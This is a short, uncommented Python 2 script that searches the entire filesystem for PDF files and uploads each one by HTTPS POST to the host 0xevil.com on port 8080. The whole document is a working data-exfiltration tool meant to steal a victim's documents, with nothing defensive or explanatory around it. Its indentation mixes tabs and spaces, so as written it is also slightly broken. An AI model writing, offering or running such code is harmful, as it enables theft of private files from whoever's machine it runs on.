import httplib, urllib
import os

conn = httplib.HTTPSConnection("0xevil.com", 8080)

for root, dirs, files in os.walk("/"):
    for file in files:
        if file.endswith(".pdf"):
			target_file = os.path.join(root, file)
			print(target_file)
			f = open(target_file, "r")
			target_file_data = f.read()
			headers = {"Content-Length": str(len(target_file_data))}
			conn.request('POST', '/upload_file=' + file, target_file_data, headers)
			response = conn.getresponse()
			data = response.read()
			print data

conn.close()